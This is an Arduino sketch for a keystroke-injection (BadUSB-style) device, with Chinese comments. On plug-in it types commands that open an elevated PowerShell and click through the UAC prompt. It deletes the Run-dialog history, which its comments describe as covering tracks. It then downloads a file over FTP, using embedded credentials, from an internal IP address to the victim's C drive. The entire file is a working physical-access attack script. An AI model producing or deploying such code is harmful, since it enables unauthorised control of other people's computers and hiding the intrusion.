#include <Keyboard.h>

#define DELAYTIME 400

void setup()
{
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(DELAYTIME);

  //开启大写锁定
  Keyboard.press(KEY_CAPS_LOCK);
  delay(DELAYTIME);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(DELAYTIME);

  //启动管理员级别的powershell
  Keyboard.press(KEY_LEFT_GUI);
  delay(DELAYTIME);
  Keyboard.press('r');
  delay(DELAYTIME);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(DELAYTIME);
  Keyboard.println("powershell.exe -command start-process powershell -verb runAs");  //开启管理员级别的powershell
  delay(DELAYTIME);

  //绕过UAC
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(DELAYTIME);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(DELAYTIME);
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);

  //掩盖行为
  Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(DELAYTIME);
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);
//  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
//  delay(DELAYTIME);
//  Keyboard.press(KEY_RETURN);
//  delay(DELAYTIME);
//  Keyboard.release(KEY_RETURN);
//  delay(DELAYTIME);

  //装载载荷
  Keyboard.println("$P = nEW-oBJECT sYSTEM.nET.wEBcLIENT");
  delay(DELAYTIME);
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.println("$P.dOWNLOADfILE('FTP://s6:121@10.105.249.149/test.txt','c:\\test.txt')");
  delay(DELAYTIME);
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);

  //恢复常态
  Keyboard.print("exit");
  delay(DELAYTIME);
  Keyboard.press(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.release(KEY_RETURN);
  delay(DELAYTIME);
  Keyboard.press(KEY_CAPS_LOCK);
  delay(DELAYTIME);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(DELAYTIME);

  Keyboard.end();
}

void loop()
{
  // put your main code here, to run repeatedly:

}
